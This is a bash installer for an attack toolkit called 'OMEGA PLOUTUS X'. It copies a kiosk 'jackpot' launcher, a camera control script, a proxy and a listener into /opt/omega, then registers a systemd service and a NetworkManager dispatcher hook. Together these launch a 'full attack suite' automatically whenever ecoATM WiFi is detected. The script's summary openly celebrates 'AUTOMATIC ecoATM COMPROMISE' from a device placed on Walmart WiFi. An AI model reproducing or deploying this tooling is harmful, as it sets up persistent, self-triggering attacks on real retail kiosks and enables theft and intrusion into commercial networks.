#!/bin/bash
# OMEGA PLOUTUS X - Auto-Start Installation Script
# Sets up automatic ecoATM deployment when ecoATM WiFi is detected
# REQUIRES ROOT PRIVILEGES

set -e

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

# Installation directories
OMEGA_DIR="/opt/omega"
SYSTEMD_DIR="/etc/systemd/system"
DISPATCHER_DIR="/etc/NetworkManager/dispatcher.d"

# Log function
log() {
    echo -e "${GREEN}[$(date '+%H:%M:%S')]${NC} $*"
}

error() {
    echo -e "${RED}[ERROR]${NC} $*" >&2
}

warning() {
    echo -e "${YELLOW}[WARNING]${NC} $*"
}

# Check root privileges
check_root() {
    if [[ $EUID -ne 0 ]]; then
        error "This script must be run as root (sudo)"
        exit 1
    fi
}

# Verify current directory has OMEGA files
verify_omega_files() {
    local required_files=(
        "omega_launcher.py"
        "auto_ecoATM_deploy.sh"
        "network_config.sh"
        "omega_network_dispatcher"
        "omega_autostart.service"
    )

    for file in "${required_files[@]}"; do
        if [[ ! -f "$file" ]]; then
            error "Required file not found: $file"
            exit 1
        fi
    done

    log "✅ All required OMEGA files verified"
}

# Create OMEGA installation directory
create_omega_directory() {
    log "Creating OMEGA installation directory: $OMEGA_DIR"

    if [[ ! -d "$OMEGA_DIR" ]]; then
        mkdir -p "$OMEGA_DIR"
        log "✅ Created directory: $OMEGA_DIR"
    else
        warning "Directory already exists: $OMEGA_DIR"
    fi
}

# Install OMEGA files
install_omega_files() {
    log "Installing OMEGA files to $OMEGA_DIR"

    # Copy all necessary files
    local files_to_copy=(
        "omega_launcher.py"
        "auto_ecoATM_deploy.sh"
        "network_config.sh"
        "omega_kiosk_attack/kiosk_jackpot_launcher.py"
        "ecoATM/camera_control.py"
        "proxy_servers/badass_proxy_clean.py"
        "server_listener/omega_cli.py"
    )

    for file in "${files_to_copy[@]}"; do
        if [[ -f "$file" ]]; then
            cp "$file" "$OMEGA_DIR/"
            log "✅ Copied: $file"
        else
            warning "File not found: $file"
        fi
    done

    # Make scripts executable
    chmod +x "$OMEGA_DIR/auto_ecoATM_deploy.sh"
    chmod +x "$OMEGA_DIR/network_config.sh"
    log "✅ Made scripts executable"
}

# Install systemd service
install_systemd_service() {
    log "Installing systemd service"

    local service_file="$OMEGA_DIR/omega_autostart.service"

    if [[ -f "omega_autostart.service" ]]; then
        cp "omega_autostart.service" "$SYSTEMD_DIR/"
        log "✅ Copied systemd service file"

        # Reload systemd and enable service
        systemctl daemon-reload
        systemctl enable omega-ecosystem.service
        log "✅ Enabled OMEGA systemd service"
    else
        error "Systemd service file not found"
        return 1
    fi
}

# Install NetworkManager dispatcher
install_network_dispatcher() {
    log "Installing NetworkManager dispatcher"

    local dispatcher_file="$OMEGA_DIR/omega_network_dispatcher"

    if [[ -f "omega_network_dispatcher" ]]; then
        cp "omega_network_dispatcher" "$DISPATCHER_DIR/"
        chmod +x "$DISPATCHER_DIR/omega_network_dispatcher"
        log "✅ Installed NetworkManager dispatcher"
        log "✅ Made dispatcher executable"
    else
        error "NetworkManager dispatcher file not found"
        return 1
    fi
}

# Create ecosystem autostart script
create_ecosystem_autostart() {
    log "Creating ecosystem auto-start script"

    cat > "$OMEGA_DIR/ecosystem_autostart.sh" << 'EOF'
#!/bin/bash
# OMEGA PLOUTUS X - Ecosystem Auto-Start Script
# Called by systemd service when ecoATM WiFi is detected

# Load network configuration
source /opt/omega/network_config.sh

# Log function
log() {
    echo "$(date '+%Y-%m-%d %H:%M:%S') - $*" >> /var/log/omega_autostart.log
    logger -t "omega-autostart" "$*"
}

log "OMEGA ecosystem auto-start triggered"

# Verify we're connected to ecoATM
if nmcli device status | grep -q "ecoATM"; then
    log "ecoATM WiFi confirmed - launching deployment"

    # Change to OMEGA directory
    cd /opt/omega

    # Launch deployment
    ./auto_ecoATM_deploy.sh

    log "OMEGA deployment completed"
else
    log "ecoATM WiFi not detected - aborting"
fi
EOF

    chmod +x "$OMEGA_DIR/ecosystem_autostart.sh"
    log "✅ Created ecosystem auto-start script"
}

# Test installation
test_installation() {
    log "Testing OMEGA installation"

    # Test OMEGA directory
    if [[ ! -d "$OMEGA_DIR" ]]; then
        error "OMEGA directory not created"
        return 1
    fi

    # Test required files
    local required_files=(
        "$OMEGA_DIR/omega_launcher.py"
        "$OMEGA_DIR/auto_ecoATM_deploy.sh"
        "$OMEGA_DIR/network_config.sh"
    )

    for file in "${required_files[@]}"; do
        if [[ ! -f "$file" ]]; then
            error "Required file not installed: $file"
            return 1
        fi
    done

    # Test NetworkManager dispatcher
    if [[ ! -x "$DISPATCHER_DIR/omega_network_dispatcher" ]]; then
        error "NetworkManager dispatcher not properly installed"
        return 1
    fi

    log "✅ OMEGA installation test passed"
    return 0
}

# Show installation summary
show_installation_summary() {
    echo
    echo "╔══════════════════════════════════════════════════════════════╗"
    echo "║                 🔥 OMEGA INSTALLATION COMPLETE 🔥               ║"
    echo "╚══════════════════════════════════════════════════════════════╝"
    echo
    echo "📁 Installation Directory: $OMEGA_DIR"
    echo "🌐 Network Dispatcher: $DISPATCHER_DIR/omega_network_dispatcher"
    echo "⚙️  Systemd Service: omega-ecosystem.service"
    echo
    echo "🚀 AUTO-START BEHAVIOR:"
    echo "  • Device connects to Walmart WiFi (normal operation)"
    echo "  • When ecoATM WiFi is detected, automatically:"
    echo "    • Creates secondary network interface"
    echo "    • Connects to ecoATM network"
    echo "    • Launches full attack suite"
    echo "    • Opens monitoring terminal"
    echo
    echo "📊 MONITORING:"
    echo "  • System logs: journalctl -u omega-ecosystem"
    echo "  • Deployment logs: /var/log/omega_deployment.log"
    echo "  • Dispatcher logs: /var/log/omega_dispatcher.log"
    echo
    echo "✅ READY FOR AUTOMATIC ecoATM COMPROMISE!"
    echo
    echo "💡 To test: Connect to ecoATM WiFi and watch the magic happen!"
}

# Main installation function
main() {
    echo "🔥 OMEGA PLOUTUS X - AUTO-START INSTALLATION"
    echo "=========================================="
    echo

    check_root
    verify_omega_files
    create_omega_directory
    install_omega_files
    create_ecosystem_autostart
    install_systemd_service
    install_network_dispatcher

    if test_installation; then
        show_installation_summary

        echo
        read -p "Reboot now to activate auto-start? (y/N): " -n 1 -r
        echo
        if [[ $REPLY =~ ^[Yy]$ ]]; then
            log "Rebooting to activate OMEGA auto-start..."
            reboot
        else
            log "Please reboot manually to activate auto-start functionality"
        fi
    else
        error "Installation failed - please check errors above"
        exit 1
    fi
}

# Run main installation
main "$@"
